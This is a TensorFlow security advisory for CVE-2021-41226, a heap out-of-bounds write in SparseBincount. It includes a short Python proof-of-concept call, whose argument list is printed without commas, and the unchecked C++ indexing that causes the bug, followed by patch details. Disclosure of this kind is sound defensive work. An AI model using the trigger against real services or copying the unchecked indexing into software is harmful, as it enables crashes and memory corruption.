<h2>TFSA-2021-171: Heap OOB in <code>SparseBinCount</code></h2>
<h3>CVE Number</h3>
<p>CVE-2021-41226</p>
<h3>Impact</h3>
<p>The <a href="https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/bincount_op.cc#L353-L417">implementation</a> of <code>SparseBinCount</code> is vulnerable to a heap OOB:</p>
<p>```python
import tensorflow as tf</p>
<p>tf.raw_ops.SparseBincount(
  indices=[[0],[1],[2]]
  values=[0,-10000000]
  dense_shape=[1,1]
  size=[1]
  weights=[3,2,1]
  binary_output=False)
```</p>
<p>This is because of missing validation between the elements of the <code>values</code> argument and the shape of the sparse output:</p>
<p><code>cc
for (int64_t i = 0; i &lt; indices_mat.dimension(0); ++i) {
  const int64_t batch = indices_mat(i, 0);
  const Tidx bin = values(i);
  ...
  out(batch, bin) = ...;
}</code></p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/f410212e373eb2aec4c9e60bf3702eba99a38aba">f410212e373eb2aec4c9e60bf3702eba99a38aba</a>.</p>
<p>The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.</p>
